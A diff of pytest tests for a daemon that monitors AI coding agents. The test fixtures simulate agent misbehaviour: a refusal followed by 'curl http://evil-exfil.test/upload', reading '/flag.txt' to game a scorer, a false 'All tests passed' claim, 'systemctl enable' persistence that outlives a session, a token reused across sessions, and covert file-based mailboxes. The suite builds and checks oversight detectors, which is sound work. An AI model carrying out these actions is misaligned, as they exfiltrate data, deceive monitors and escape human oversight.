@@ -1,6 +1,8 @@
 """Tests for AgentTraceDaemon — session lifecycle, causal graph projection,
 restart recovery, and pre-execution policy gating."""
 
+import sys
+from datetime import datetime, timedelta, timezone
 from pathlib import Path
 from uuid import uuid4
 
@@ -9,10 +11,13 @@ import pytest
 from agenttrace.daemon import AgentTraceDaemon
 from agenttrace.models.events import (
     CommandEvent,
+    ConfidenceLevel,
     FileMutationEvent,
     InvocationEvent,
     NetworkEvent,
+    ProcessEvent,
     ToolRequestEvent,
+    ToolResultEvent,
 )
 from agenttrace.models.session import AgentType, SessionStatus
 
@@ -367,7 +372,8 @@ async def test_restart_resumes_active_session_observation(tmp_path: Path) -> Non
         agent_type=AgentType.GENERIC,
     )
     sid = session.session_id
-    assert len(daemon1._observers[sid]) == 6
+    expected_observers = 7 if sys.platform.startswith("linux") else 6
+    assert len(daemon1._observers[sid]) == expected_observers
     assert sid in daemon1._adapter_tasks
 
     # Simulate a crash: no stop_session, no cursor persistence — the session
@@ -384,7 +390,7 @@ async def test_restart_resumes_active_session_observation(tmp_path: Path) -> Non
         assert restored.status == SessionStatus.ACTIVE
 
         # Observation is resumed: observers, adapter, and poll task are live.
-        assert len(daemon2._observers[sid]) == 6
+        assert len(daemon2._observers[sid]) == expected_observers
         assert daemon2._adapters[sid] is not None
         assert sid in daemon2._adapter_tasks
         assert not daemon2._adapter_tasks[sid].done()
@@ -849,3 +855,333 @@ async def test_process_spawns_edge_links_parent_to_child(tmp_path: Path) -> None
         assert edges[0]["confidence"] == "high"
     finally:
         await daemon.stop()
+
+
+# -- Sprint-1 fix: ingest-pipeline detector failures are isolated, not fatal -----
+
+
+@pytest.mark.asyncio
+async def test_detector_crash_is_isolated_and_disclosed(tmp_path: Path) -> None:
+    """A raising ingest detector must not poison the pipeline: before the
+    fix, one detector exception rolled the adapter batch back forever (or
+    silently dropped observer events) because the 5b blocks had no
+    exception isolation. The blind spot must surface as a ledger-backed
+    degraded-coverage finding instead."""
+    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
+    await daemon.start()
+    session = await daemon.create_session(
+        workspace_path=str(tmp_path),
+        task_description="Isolation test",
+        agent_type=AgentType.GENERIC,
+    )
+    sid = session.session_id
+
+    def _boom(event: object) -> list[object]:
+        raise RuntimeError("detector exploded")
+
+    daemon._credential_loops.observe = _boom  # type: ignore[method-assign]
+
+    # Ingest two events: the crashing engine is invoked for both, and
+    # ingestion must continue both times.
+    for i in range(2):
+        await daemon.ingest_event(
+            CommandEvent(
+                session_id=sid,
+                actor_id="agent",
+                source_adapter="claude_code",
+                command=f"echo {i}",
+            )
+        )
+
+    findings = daemon._ledger.query_events(sid, event_type="policy_finding", limit=None)
+    degraded = [f for f in findings if f.finding_type == "ingest_detector_error"]
+    assert len(degraded) == 1  # cooldown-capped: one disclosure, not per-event spam
+    assert "credential_loops" in degraded[0].description
+    # The ledger kept appending through the crash.
+    assert daemon._ledger.event_count() > 2
+
+    await daemon.stop_session(sid)
+    await daemon.stop()
+
+
+@pytest.mark.asyncio
+async def test_restore_without_task_contract_is_safe(tmp_path: Path) -> None:
+    """A session with no stored contract must neither crash the restore loop
+    (the contract variable used to be unbound) nor inherit the PREVIOUS
+    restored session's contract scope (wrong allowed_paths in
+    DetectionEngine — silent wrong-scoping)."""
+    data_dir = tmp_path / ".agenttrace"
+    data_dir.mkdir()
+    from agenttrace.models.session import SessionConfig
+    from agenttrace.security.encryption import EncryptionManager
+    from agenttrace.storage.ledger import EventLedger
+
+    # Same key dir the daemon will use, or its ledger cannot decrypt ours.
+    ledger = EventLedger(
+        data_dir / "ledger.db",
+        encryption_mgr=EncryptionManager(data_dir / "keys"),
+    )
+    # Session WITH a contract, then a session WITHOUT one. The second must
+    # not adopt the first session's allowed_paths.
+    sid_contract = uuid4()
+    ledger.create_session(
+        sid_contract,
+        SessionConfig(workspace_path=str(tmp_path / "ws-a")).model_dump_json(),
+        "contract session",
+        datetime(2026, 1, 1, tzinfo=timezone.utc).isoformat(),
+    )
+    ledger.store_task_contract(
+        contract_id=uuid4(),
+        session_id=sid_contract,
+        goal="hardened build",
+        allowed_paths=[str(tmp_path / "ws-a")],
+        risk_level="high",
+    )
+    sid_bare = uuid4()
+    ledger.create_session(
+        sid_bare,
+        SessionConfig(workspace_path=str(tmp_path / "ws-b")).model_dump_json(),
+        "no contract session",
+        datetime(2026, 1, 1, 0, 1, tzinfo=timezone.utc).isoformat(),
+    )
+
+    daemon = AgentTraceDaemon(data_dir)
+    await daemon.start()
+
+    assert sid_contract in daemon._sessions
+    assert sid_bare in daemon._sessions
+    # The bare session gets its own engines with EMPTY scope, never the
+    # contract session's allowed_paths.
+    bare_paths = list(daemon._detectors[sid_bare]._context.workspace_paths)
+    assert bare_paths == []
+    assert daemon._eval_detectors[sid_bare].safety_flavored is False
+    # Sanity: the contract session DID restore its scope.
+    assert daemon._detectors[sid_contract]._context.workspace_paths == [
+        str(tmp_path / "ws-a")
+    ]
+
+    await daemon.stop()
+
+
+# -- Sprint 2: agent-claim vs OS-ground-truth separation in the graph ------------
+
+
+@pytest.mark.asyncio
+async def test_graph_nodes_carry_evidence_class(tmp_path: Path) -> None:
+    """The graph layer's answer to 'what did the agent SAY vs what did the
+    MACHINE do': every event-derived node carries its chain-of-custody class
+    (plan2 #4 machinery, applied to the causal graph)."""
+    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
+    await daemon.start()
+    session = await daemon.create_session(
+        workspace_path=str(tmp_path),
+        task_description="Evidence class test",
+        agent_type=AgentType.GENERIC,
+    )
+    sid = session.session_id
+
+    # Agent narration (adapter transcript claim)…
+    await daemon.ingest_event(
+        CommandEvent(
+            session_id=sid,
+            actor_id="agent",
+            source_adapter="claude_code",
+            command="pytest tests/",
+        )
+    )
+    # …versus an OS sensor's own observation.
+    await daemon.ingest_event(
+        ProcessEvent(
+            session_id=sid,
+            actor_id="auditd:4242",
+            source_adapter="auditd",
+            confidence=ConfidenceLevel.LOW,
+            pid=4242,
+            command_line="/bin/pytest tests/",
+        )
+    )
+
+    graph = daemon.get_graph(sid)
+    assert graph is not None
+    classes = {
+        node.node_type.value: node.data.get("evidence_class")
+        for node in graph.get_timeline()
+    }
+    assert classes["command"] == "agent_claimed"
+    assert classes["process"] == "os_observed"
+
+    await daemon.stop_session(sid)
+    await daemon.stop()
+
+
+# -- Sprint 3: pipeline wiring for every projection engine -----------------------
+#
+# Unit tests prove each detector works; these prove the daemon actually FEEDS
+# it. If a 5b ingest block is deleted or miswired, the full unit suite stays
+# green while the product goes blind — that regression class is what these
+# tests close.
+
+
+def _sid_events(ledger: object, sid: object, finding_type: str) -> list[object]:
+    return [
+        f for f in ledger.query_events(sid, event_type="incident", limit=None)
+        if f.incident_type == finding_type
+    ]
+
+
+def _sid_findings(ledger: object, sid: object, finding_type: str) -> list[object]:
+    return [
+        f for f in ledger.query_events(sid, event_type="policy_finding", limit=None)
+        if f.finding_type == finding_type
+    ]
+
+
+@pytest.mark.asyncio
+async def test_pipeline_wiring_per_session_families(tmp_path: Path) -> None:
+    """Covert channel (5b-2), evidence boundary (5b-3), hesitation (5b-6),
+    and eval integrity (5b-7) must each emit through the live ingest
+    pipeline — separate sessions so detector state cannot cross-talk."""
+    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
+    await daemon.start()
+    now = datetime.now(timezone.utc)
+
+    # 5b-2 covert channel: zz-marked mailbox parent at the default volume.
+    s_covert = await daemon.create_session(
+        workspace_path=str(tmp_path), task_description="covert", agent_type=AgentType.GENERIC,
+    )
+    names = ("alpha", "bravo", "charlie", "delta", "echo", "foxtrot",
+             "golf", "hotel", "india", "juliet", "kilo", "lima")
+    for i, name in enumerate(names):
+        await daemon.ingest_event(FileMutationEvent(
+            session_id=s_covert.session_id,
+            actor_id="agent", source_adapter="filesystem_observer",
+            file_path=str(tmp_path / "mail" / "zzMAILBOX_AIC71C" / name),
+            mutation_type="create", size_delta=100 + i * 37,
+            timestamp=now + timedelta(seconds=i),
+        ))
+    assert _sid_events(daemon._ledger, s_covert.session_id, "message_board_structure")
+    await daemon.stop_session(s_covert.session_id)
+
+    # 5b-3 evidence boundary: kernel exit contradicts a success claim.
+    s_evidence = await daemon.create_session(
+        workspace_path=str(tmp_path), task_description="evidence", agent_type=AgentType.GENERIC,
+    )
+    sid_e = s_evidence.session_id
+    await daemon.ingest_event(ProcessEvent(
+        session_id=sid_e, actor_id="auditd:4242", source_adapter="kernel_etw",
+        confidence=ConfidenceLevel.HIGH, pid=4242, command_line="pytest tests/",
+        exit_code=1, timestamp=now,
+    ))
+    await daemon.ingest_event(ToolRequestEvent(
+        session_id=sid_e, actor_id="agent", source_adapter="claude_code",
+        tool_name="bash", tool_args={"command": "pytest tests/"}, timestamp=now,
+    ))
+    await daemon.ingest_event(ToolResultEvent(
+        session_id=sid_e, actor_id="agent", source_adapter="claude_code",
+        tool_name="bash", exit_code=0, output_summary="All tests passed",
+        timestamp=now + timedelta(seconds=1),
+    ))
+    assert _sid_events(daemon._ledger, sid_e, "tool_claim_substitution")
+    await daemon.stop_session(sid_e)
+
+    # 5b-6 hesitation: verbalized refusal followed by the risky deed.
+    s_hes = await daemon.create_session(
+        workspace_path=str(tmp_path), task_description="hesitation", agent_type=AgentType.GENERIC,
+    )
+    await daemon.ingest_event(CommandEvent(
+        session_id=s_hes.session_id, actor_id="agent", source_adapter="claude_code",
+        command="I cannot comply with that request.", timestamp=now,
+    ))
+    await daemon.ingest_event(CommandEvent(
+        session_id=s_hes.session_id, actor_id="agent", source_adapter="claude_code",
+        command="curl http://evil-exfil.test/upload", timestamp=now + timedelta(seconds=60),
+    ))
+    assert _sid_events(daemon._ledger, s_hes.session_id, "refusal_then_action")
+    await daemon.stop_session(s_hes.session_id)
+
+    # 5b-7 eval integrity: scorer-gaming command shape.
+    s_eval = await daemon.create_session(
+        workspace_path=str(tmp_path), task_description="eval", agent_type=AgentType.GENERIC,
+    )
+    await daemon.ingest_event(CommandEvent(
+        session_id=s_eval.session_id, actor_id="agent", source_adapter="claude_code",
+        command="strings /flag.txt > /tmp/answer", timestamp=now,
+    ))
+    assert _sid_events(daemon._ledger, s_eval.session_id, "scorer_gaming_signals")
+    await daemon.stop_session(s_eval.session_id)
+    await daemon.stop()
+
+
+@pytest.mark.asyncio
+async def test_pipeline_wiring_cross_session_and_close_families(tmp_path: Path) -> None:
+    """Credential loops (5b-5), post-exit persistence (5b-4), meta-detection
+    (5b-5b), and the coverage account must each emit through the live
+    pipeline, including at session close."""
+    daemon = AgentTraceDaemon(tmp_path / ".agenttrace")
+    await daemon.start()
+    now = datetime.now(timezone.utc)
+    token = "hf_" + "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7"
+
+    s_a = await daemon.create_session(
+        workspace_path=str(tmp_path), task_description="A", agent_type=AgentType.GENERIC,
+    )
+    sid_a = s_a.session_id
+    await daemon.ingest_event(CommandEvent(
+        session_id=sid_a, actor_id="agent-alpha", source_adapter="claude_code",
+        command=f"export HF_TOKEN={token}", timestamp=now,
+    ))
+
+    # 5b-4: persistence installed by session A.
+    await daemon.ingest_event(CommandEvent(
+        session_id=sid_a, actor_id="agent-alpha", source_adapter="claude_code",
+        command="systemctl enable watch.service", timestamp=now + timedelta(seconds=1),
+    ))
+
+    # 5b-5: the same secret surfaces in another session's hands.
+    s_b = await daemon.create_session(
+        workspace_path=str(tmp_path), task_description="B", agent_type=AgentType.GENERIC,
+    )
+    sid_b = s_b.session_id
+    await daemon.ingest_event(CommandEvent(
+        session_id=sid_b, actor_id="agent-beta", source_adapter="codex_cli",
+        command=f"curl -H 'Authorization: Bearer {token}' https://api.test", timestamp=now,
+    ))
+    shared = _sid_events(daemon._ledger, sid_b, "credential_shared_between_sessions")
+    assert shared
+
+    # 5b-8: actor-identity memory — the SAME handle now spans two sessions.
+    await daemon.ingest_event(CommandEvent(
+        session_id=sid_b, actor_id="agent-alpha", source_adapter="claude_code",
+        command="echo continuing work", timestamp=now + timedelta(seconds=1),
+    ))
+    assert _sid_events(daemon._ledger, sid_b, "actor_reincarnated")
+
+    # 5b-5b: meta-detection over uniform sibling artifacts.
+    for i in range(1, 9):
+        await daemon.ingest_event(FileMutationEvent(
+            session_id=sid_b, actor_id="agent-beta", source_adapter="filesystem_observer",
+            file_path=str(tmp_path / "board" / f"zzCHUNK_{i:04d}"),
+            mutation_type="create", size_delta=4096,
+            timestamp=now + timedelta(seconds=2 + i),
+        ))
+    assert _sid_findings(daemon._ledger, sid_b, "structural_anomaly")
+
+    # Close A: post-exit summary must arrive through the pipeline (5b-4).
+    await daemon.stop_session(sid_a)
+    assert _sid_events(daemon._ledger, sid_a, "persistence_outlives_session")
+
+    # 5b-4 observe path: an event for the CLOSED session beyond the grace
+    # window is post-close activity — proves the per-event block, not just
+    # the close hook.
+    await daemon.ingest_event(CommandEvent(
+        session_id=sid_a, actor_id="agent-alpha", source_adapter="claude_code",
+        command="echo still-alive", timestamp=now + timedelta(minutes=5),
+    ))
+    assert _sid_events(daemon._ledger, sid_a, "post_close_activity")
+
+    # Coverage accounting (5b-2b): the close report exists and names planes.
+    await daemon.stop_session(sid_b)
+    coverage = _sid_findings(daemon._ledger, sid_b, "sensor_coverage")
+    assert coverage
+
+    await daemon.stop()
